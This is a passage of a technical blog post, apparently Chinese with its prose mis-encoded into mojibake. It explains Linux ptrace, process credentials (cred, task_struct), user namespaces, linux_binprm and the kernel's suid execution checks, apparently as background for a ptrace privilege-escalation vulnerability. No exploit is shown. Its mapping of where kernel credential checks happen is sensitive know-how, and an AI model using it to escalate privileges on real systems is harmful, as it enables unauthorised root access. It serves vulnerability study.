class="comment">// parent</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(&amp;wait_val); <span class="comment">// waiting for the signal from child</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Parent received signal, running...&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (wait_val == <span class="number">1407</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            instructions++;</span><br><span class="line">            <span class="keyword">if</span> (ptrace(PTRACE_SINGLESTEP, child_pid, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">                perror(<span class="string">&quot;ptrace error!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            wait(&amp;wait_val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Done for %d instructions.\n&quot;</span>, instructions);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Parent quit.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/01/13/ZodQuBfgsrLCXlp.png" alt="image.png"></p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œptrace <strong>åªèƒ½è°ƒè¯•å±äº ptracer æ‰€å±ç”¨æˆ·çš„è¿›ç¨‹</strong>ï¼Œä¾‹å¦‚æ™®é€šç”¨æˆ·ä¾¿ä¸èƒ½è°ƒè¯• root è¿›ç¨‹</p><h2 id="task-structï¼šè¿›ç¨‹æè¿°ç¬¦ï¼ˆprocess-descriptorï¼‰"><a href="#task-structï¼šè¿›ç¨‹æè¿°ç¬¦ï¼ˆprocess-descriptorï¼‰" class="headerlink" title="task_structï¼šè¿›ç¨‹æè¿°ç¬¦ï¼ˆprocess descriptorï¼‰"></a>task_structï¼šè¿›ç¨‹æè¿°ç¬¦ï¼ˆprocess descriptorï¼‰</h2><p>åœ¨ Linux ä¸­ä¸€ä¸ªè¿›ç¨‹ä¾¿æ˜¯ä¸€ä¸ª taskï¼Œåœ¨ kernel ä¸­ä½¿ç”¨ä¸€ä¸ª <code>task_struct</code> ç»“æ„ä½“è¿›è¡Œæ ‡è¯†ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äºå†…æ ¸æºç <code>include/linux/sched.h</code>ä¸­</p><p>æˆ‘ä»¬ä¸»è¦å…³å¿ƒå…¶å¯¹äºè¿›ç¨‹æƒé™çš„ç®¡ç†ï¼Œæ³¨æ„åˆ°<code>task_struct</code>çš„æºç ä¸­æœ‰å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">cred</span>;</span></span><br></pre></td></tr></table></figure><p><strong>Process credentials</strong> æ˜¯ kernel ç”¨ä»¥åˆ¤æ–­ä¸€ä¸ªè¿›ç¨‹æƒé™çš„å‡­è¯ï¼Œåœ¨ kernel ä¸­ä½¿ç”¨ <code>cred</code> ç»“æ„ä½“è¿›è¡Œæ ‡è¯†ï¼Œå¯¹äºä¸€ä¸ªè¿›ç¨‹è€Œè¨€åº”å½“æœ‰ä¸‰ä¸ª credï¼š</p><ul><li><strong>ptracer_credï¼š</strong>ä½¿ç”¨<code>ptrace</code>ç³»ç»Ÿè°ƒç”¨è·Ÿè¸ªè¯¥è¿›ç¨‹çš„è°ƒè¯•è¿›ç¨‹ï¼ˆptracerï¼‰çš„ cred</li><li><strong>real_credï¼š</strong>å³<strong>å®¢ä½“å‡­è¯</strong>ï¼ˆ<strong>objective cred</strong>ï¼‰ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªè¿›ç¨‹æœ€åˆå¯åŠ¨æ—¶æ‰€å…·æœ‰çš„æƒé™</li><li><strong>credï¼š</strong>å³<strong>ä¸»ä½“å‡­è¯</strong>ï¼ˆ<strong>subjective cred</strong>ï¼‰ï¼Œè¯¥è¿›ç¨‹çš„æœ‰æ•ˆcredï¼Œkernelä»¥æ­¤ä½œä¸ºè¿›ç¨‹æƒé™çš„å‡­è¯</li></ul><h2 id="credï¼šè¿›ç¨‹æƒé™å‡­è¯ï¼ˆcredentialsï¼‰"><a href="#credï¼šè¿›ç¨‹æƒé™å‡­è¯ï¼ˆcredentialsï¼‰" class="headerlink" title="credï¼šè¿›ç¨‹æƒé™å‡­è¯ï¼ˆcredentialsï¼‰"></a>credï¼šè¿›ç¨‹æƒé™å‡­è¯ï¼ˆcredentialsï¼‰</h2><p>å¯¹äºä¸€ä¸ªè¿›ç¨‹ï¼Œåœ¨å†…æ ¸å½“ä¸­ä½¿ç”¨ä¸€ä¸ªç»“æ„ä½“<code>cred</code>ç®¡ç†å…¶æƒé™ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äºå†…æ ¸æºç <code>include/linux/cred.h</code>ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="type">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="type">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="type">void</span>*put_addr;</span><br><span class="line"><span class="type">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="type">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="type">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="comment">/* RCU deletion */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">int</span> non_rcu;<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨<code>cred</code>ç»“æ„ä½“ä¸­ç®¡ç†æƒé™çš„å˜é‡</p><h3 id="ç”¨æˆ·ID-amp-ç»„ID"><a href="#ç”¨æˆ·ID-amp-ç»„ID" class="headerlink" title="ç”¨æˆ·ID &amp; ç»„ID"></a>ç”¨æˆ·ID &amp; ç»„ID</h3><p>ä¸€ä¸ªcredç»“æ„ä½“ä¸­è®°è½½äº†<strong>ä¸€ä¸ªè¿›ç¨‹å››ç§ä¸åŒçš„ç”¨æˆ·ID</strong>ï¼š</p><ul><li><strong>çœŸå®ç”¨æˆ·ID</strong>ï¼ˆreal UIDï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹<strong>å¯åŠ¨æ—¶çš„ç”¨æˆ·ID</strong></li><li><strong>ä¿å­˜ç”¨æˆ·ID</strong>ï¼ˆsaved UIDï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹<strong>æœ€åˆçš„æœ‰æ•ˆç”¨æˆ·ID</strong></li><li><strong>æœ‰æ•ˆç”¨æˆ·ID</strong>ï¼ˆeffective UIDï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹<strong>æ­£åœ¨è¿è¡Œæ—¶æ‰€å±çš„ç”¨æˆ·ID</strong>ï¼Œä¸€ä¸ªè¿›ç¨‹åœ¨è¿è¡Œé€”ä¸­æ˜¯å¯ä»¥æ”¹å˜è‡ªå·±æ‰€å±ç”¨æˆ·çš„ï¼Œå› è€Œæƒé™æœºåˆ¶ä¹Ÿæ˜¯é€šè¿‡æœ‰æ•ˆç”¨æˆ·IDè¿›è¡Œè®¤è¯çš„ï¼Œå†…æ ¸é€šè¿‡ euid æ¥è¿›è¡Œç‰¹æƒåˆ¤æ–­ï¼›ä¸ºäº†é˜²æ­¢ç”¨æˆ·ä¸€ç›´ä½¿ç”¨é«˜æƒé™ï¼Œå½“ä»»åŠ¡å®Œæˆä¹‹åï¼Œeuid ä¼šä¸ suid è¿›è¡Œäº¤æ¢ï¼Œæ¢å¤è¿›ç¨‹çš„æœ‰æ•ˆæƒé™</li><li><strong>æ–‡ä»¶ç³»ç»Ÿç”¨æˆ·ID</strong>ï¼ˆUID for VFS opsï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹<strong>åˆ›å»ºæ–‡ä»¶æ—¶è¿›è¡Œæ ‡è¯†çš„ç”¨æˆ·ID</strong></li></ul><p>åœ¨é€šå¸¸æƒ…å†µä¸‹è¿™å‡ ä¸ªIDåº”å½“éƒ½æ˜¯ç›¸åŒçš„</p><p>ç”¨æˆ·ç»„IDåŒæ ·åˆ†ä¸ºå››ä¸ªï¼š<code>çœŸå®ç»„ID</code>ã€<code>ä¿å­˜ç»„ID</code>ã€<code>æœ‰æ•ˆç»„ID</code>ã€<code>æ–‡ä»¶ç³»ç»Ÿç»„ID</code>ï¼Œä¸ç”¨æˆ·IDæ˜¯ç±»ä¼¼çš„ï¼Œè¿™é‡Œä¾¿ä¸å†èµ˜å™</p><h3 id="å‘½åç©ºé—´ï¼ˆnamespaceï¼‰"><a href="#å‘½åç©ºé—´ï¼ˆnamespaceï¼‰" class="headerlink" title="å‘½åç©ºé—´ï¼ˆnamespaceï¼‰"></a>å‘½åç©ºé—´ï¼ˆnamespaceï¼‰</h3><p>cred ç»“æ„ä½“ä¸­çš„ user_ns  å­—æ®µæ ‡è¯†äº†è¯¥è¿›ç¨‹æ‰€å±çš„å‘½åç©ºé—´</p><h2 id="namespaceï¼šå‘½åç©ºé—´"><a href="#namespaceï¼šå‘½åç©ºé—´" class="headerlink" title="namespaceï¼šå‘½åç©ºé—´"></a>namespaceï¼šå‘½åç©ºé—´</h2><p><strong>å‘½åç©ºé—´</strong>ï¼ˆ<strong>namespace</strong>ï¼‰ <strong>æ˜¯ Linux kernel ç”¨æ¥éš”ç¦»å†…æ ¸èµ„æºçš„æ–¹å¼ã€‚</strong> é€šè¿‡ namespace å¯ä»¥è®©ä¸€äº›è¿›ç¨‹åªèƒ½çœ‹åˆ°ä¸è‡ªå·±ç›¸å…³çš„ä¸€éƒ¨åˆ†èµ„æºï¼Œè€Œå¦å¤–ä¸€äº›è¿›ç¨‹ä¹Ÿåªèƒ½çœ‹åˆ°ä¸å®ƒä»¬è‡ªå·±ç›¸å…³çš„èµ„æºï¼ŒåŒæ–¹éƒ½æ— æ³•è®¿é—®å¯¹æ–¹å‘½åç©ºé—´ä¸­çš„èµ„æº</p><p>åœ¨ cred å½“ä¸­æœ‰æŒ‡å‘å…¶æ‰€å±å‘½åç©ºé—´çš„æŒ‡é’ˆï¼Œåœ¨Linux kernel ä¸­å‘½åç©ºé—´ä¸ºä¸€ä¸ª <code>user_namespace</code> ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>/include/linux/user_namespace.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uid_gid_map</span><span class="title">uid_map</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uid_gid_map</span><span class="title">gid_map</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uid_gid_map</span><span class="title">projid_map</span>;</span></span><br><span class="line"><span class="type">atomic_t</span>count;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span>*<span class="title">parent</span>;</span></span><br><span class="line"><span class="type">int</span>level;</span><br><span class="line"><span class="type">kuid_t</span>owner;</span><br><span class="line"><span class="type">kgid_t</span>group;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ns_common</span><span class="title">ns</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Register of per-UID persistent keyrings for this namespace */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PERSISTENT_KEYRINGS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">persistent_keyring_register</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span><span class="title">persistent_keyring_register_sem</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span><span class="title">work</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSCTL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctl_table_set</span><span class="title">set</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctl_table_header</span> *<span class="title">sysctls</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span>*<span class="title">ucounts</span>;</span></span><br><span class="line"><span class="type">int</span> ucount_max[UCOUNT_COUNTS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™å‡ ä¸ªå­—æ®µï¼š</p><ul><li><strong>owner</strong>ï¼šå³è¯¥å‘½åç©ºé—´çš„<strong>æ‰€æœ‰è€…</strong>ï¼›é€šå¸¸æ¥è¯´æ¯ä¸ªè¿›ç¨‹æœ‰å…¶ç‹¬ç«‹çš„å‘½åç©ºé—´ï¼Œä½†å¯¹äºä¸€äº›éœ€è¦å…±äº«èµ„æºçš„è¿›ç¨‹è€Œè¨€ä»–ä»¬æœ‰å¯èƒ½ä¼šéœ€è¦å…±äº«åŒä¸€ä¸ªå‘½åç©ºé—´</li><li><strong>group</strong>ï¼šå‘½åç©ºé—´æ‰€å±çš„ç”¨æˆ·ç»„</li><li><strong>parent</strong>ï¼šè¯¥å‘½åç©ºé—´çš„çˆ¶å‘½åç©ºé—´ï¼Œå…³ç³»ç±»ä¼¼äºçˆ¶å­è¿›ç¨‹ï¼Œæœ€ä¸Šä¸€å±‚ä¸º init_cred çš„å‘½åç©ºé—´ <code>init_user_ns</code></li></ul><h2 id="linux-binprmï¼šå¾…æ‰§è¡Œæ–‡ä»¶æ•°æ®"><a href="#linux-binprmï¼šå¾…æ‰§è¡Œæ–‡ä»¶æ•°æ®" class="headerlink" title="linux_binprmï¼šå¾…æ‰§è¡Œæ–‡ä»¶æ•°æ®"></a>linux_binprmï¼šå¾…æ‰§è¡Œæ–‡ä»¶æ•°æ®</h2><p>å‰é¢è®²åˆ° ptrace åº”å½“é…åˆç€ execve è¿›è¡Œä½¿ç”¨ï¼Œåœ¨ execve ç³»ç»Ÿè°ƒç”¨ä¸­æ¶‰åŠåˆ°ä¸€ä¸ªç»“æ„ä½“å«åš <code>linux_binprm</code>ï¼Œè¯¥ç»“æ„ä½“ç”¨ä»¥è®°å½• kernel åŠ è½½ï¼ˆå…¶å®å°±æ˜¯æ‰§è¡Œï¼‰ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ç”¨åˆ°çš„æ•°æ®ï¼Œå®šä¹‰äº <code>/include/linux/binfmts.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This structure is used to hold the arguments that are used when loading binaries.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_binprm</span> &#123;</span></span><br><span class="line"><span class="type">char</span> buf[BINPRM_BUF_SIZE];</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> vma_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_ARG_PAGES32</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>[<span class="title">MAX_ARG_PAGES</span>];</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> p; <span class="comment">/* current top of mem */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span></span><br><span class="line">cred_prepared:<span class="number">1</span>,<span class="comment">/* true if creds already prepared (multiple</span></span><br><span class="line"><span class="comment"> * preps happen for interpreters) */</span></span><br><span class="line">cap_effective:<span class="number">1</span>;<span class="comment">/* true if has elevated effective capabilities,</span></span><br><span class="line"><span class="comment"> * false if not; except for init which inherits</span></span><br><span class="line"><span class="comment"> * its parent&#x27;s caps anyway */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __alpha__</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> taso:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> recursion_depth; <span class="comment">/* only for search_binary_handler() */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span><span class="comment">/* new credentials */</span></span><br><span class="line"><span class="type">int</span> unsafe;<span class="comment">/* how unsafe this exec is (mask of LSM_UNSAFE_*) */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> per_clear;<span class="comment">/* bits to clear in current-&gt;personality */</span></span><br><span class="line"><span class="type">int</span> argc, envc;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> * filename;<span class="comment">/* Name of binary as seen by procps */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> * interp;<span class="comment">/* Name of the binary really executed. Most</span></span><br><span class="line"><span class="comment">   of the time same as filename, but could be</span></span><br><span class="line"><span class="comment">   different for binfmt_&#123;misc,script&#125; */</span></span><br><span class="line"><span class="type">unsigned</span> interp_flags;</span><br><span class="line"><span class="type">unsigned</span> interp_data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> loader, exec;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ cred å­—æ®µï¼Œå…¶æ ‡è¯†äº†è¦è¿è¡Œçš„<strong>æ–°ç¨‹åºçš„æƒé™</strong></p><h2 id="LSM-ä¸-ç¨‹åºæ‰§è¡Œæƒé™æ£€æŸ¥"><a href="#LSM-ä¸-ç¨‹åºæ‰§è¡Œæƒé™æ£€æŸ¥" class="headerlink" title="LSM ä¸ ç¨‹åºæ‰§è¡Œæƒé™æ£€æŸ¥"></a>LSM ä¸ ç¨‹åºæ‰§è¡Œæƒé™æ£€æŸ¥</h2><p>åœ¨ task_struct ç»“æ„ä½“å½“ä¸­æˆ‘ä»¬æ³¨æ„åˆ° <code>ptracer_cred</code> è¿™ä¸ªå­—æ®µï¼Œè¿™ä¸ªå­—æ®µè‡ª <code>Linux kernel 4.10</code>  å¼•å…¥åˆ° task_struct ç»“æ„ä½“å½“ä¸­ï¼Œå¼•å…¥ ptracer_cred çš„ç›®çš„æ˜¯ç”¨äºå½“ tracee æ‰§è¡Œ exec å»åŠ è½½ <a href="https://www.computerhope.com/jargon/s/setuid.htm">setuid executable</a> æ—¶åšå®‰å…¨æ£€æµ‹</p><blockquote><p>å‚è§ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=64b875f7ac8a5d60a4e191479299e931ee949b67">ptrace: Capture the ptracerâ€™s creds not PT_PTRACE_CAP</a> </p></blockquote><p>è¿™ä¸€éƒ¨åˆ†ä¼šå±•å¼€åˆ†æä¸€å®šæ•°é‡çš„å†…æ ¸æºç ï¼Œé’ˆå¯¹è¿™ä¸ªæ¼æ´è€Œè¨€ï¼Œå¯ä»¥ç›´æ¥çœ‹ç»“è®ºï¼š<strong>è‹¥ ptracee è¿›ç¨‹æ‰§è¡Œ suid&#x2F;sgid ç¨‹åºï¼Œåˆ™æ£€æŸ¥ ptracee ä¿å­˜çš„ ptracer çš„ credï¼Œå³ ptracee çš„ task_struct çš„ ptracer_cred å­—æ®µçš„æƒé™ï¼Œè‹¥æƒé™ä¸è¶³åˆ™ ptracee ä»¥å…¶è‡ªèº«çš„ euid&#x2F;egid æ‰§è¡Œç¨‹åºï¼Œè€Œéæ–‡ä»¶çš„ suid&#x2F;sgid</strong></p><h3 id="suid-x2F-sgid-æ–‡ä»¶çš„æ‰§è¡Œæµç¨‹"><a href="#suid-x2F-sgid-æ–‡ä»¶çš„æ‰§è¡Œæµç¨‹" class="headerlink" title="suid&#x2F;sgid æ–‡ä»¶çš„æ‰§è¡Œæµç¨‹"></a>suid&#x2F;sgid æ–‡ä»¶çš„æ‰§è¡Œæµç¨‹</h3><p>å½“ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œä¸€ä¸ª suid æ–‡ä»¶æ—¶ï¼ˆä¾‹å¦‚ <code>/usr/bin/passwd</code>ï¼‰ï¼Œå­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYS_execve()</span><br><span class="line">    do_execve()</span><br><span class="line">    do_execveat_common()</span><br><span class="line">    prepare_binprm()</span><br><span class="line">    bprm_fill_uid()</span><br></pre></td></tr></table></figure><p>å‡½æ•° <code>bprm_fill_uid()</code> å®šä¹‰äº <code>/fs/exec.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 